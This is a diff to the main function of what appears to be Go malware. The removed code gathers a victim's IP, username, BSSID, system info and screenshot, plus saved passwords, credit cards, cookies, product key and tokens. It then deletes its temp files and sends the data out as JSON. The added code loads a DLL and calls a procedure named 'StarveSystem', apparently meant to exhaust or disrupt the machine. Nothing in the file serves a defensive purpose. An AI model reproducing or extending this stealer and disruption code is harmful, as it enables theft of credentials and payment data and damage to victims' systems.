@@ -1,35 +1,43 @@
 package main
 
+import "C"
+
 import (
-	"encoding/json"
+	"syscall"
 )
 
 func main() {
 
-	out := OUTPUT{
-		GeneralInfo: geninf{
-			// Anchor 1
-			Ip:         GetExternIP(),
-			Username:   GetUsername(),
-			BSSID:      GetBSSID(),
-			Info:       *GetSysInfo(),
-			Screenshot: GetScreenShot(), // This is a string of b64 byte data.
-		},
-		Dumps: dumps{
-			// Anchor 2
-			Passwords:   GetPasswords(),
-			CreditCards: GetCreditCards(),
-			Cookies:     GetCookies(),
-			ProductKey:  *GetProductKey(),
-			Tokens:      GetTokens(),
-		},
+	//out := OUTPUT{
+	//	GeneralInfo: geninf{
+	//		// Anchor 1
+	//		Ip:         GetExternIP(),
+	//		Username:   GetUsername(),
+	//		BSSID:      GetBSSID(),
+	//		Info:       *GetSysInfo(),
+	//		Screenshot: GetScreenShot(), // This is a string of b64 byte data.
+	//	},
+	//	Dumps: dumps{
+	//		// Anchor 2
+	//		Passwords:   GetPasswords(),
+	//		CreditCards: GetCreditCards(),
+	//		Cookies:     GetCookies(),
+	//		ProductKey:  *GetProductKey(),
+	//		Tokens:      GetTokens(),
+	//	},
+	//}
+	//
+	//// Anchor 3
+	//
+	//CleanUp() // <- Removes all the temp files generated
+	//
+	//x, _ := json.Marshal(out)
+	//
+	//SendRequest(string(x))
+
+	lib := syscall.NewLazyDLL("module.lib.dll")
+	_, _, err := lib.NewProc("StarveSystem").Call()
+	if err != nil {
+		return
 	}
-
-	// Anchor 3
-
-	CleanUp() // <- Removes all the temp files generated
-
-	x, _ := json.Marshal(out)
-
-	SendRequest(string(x))
 }
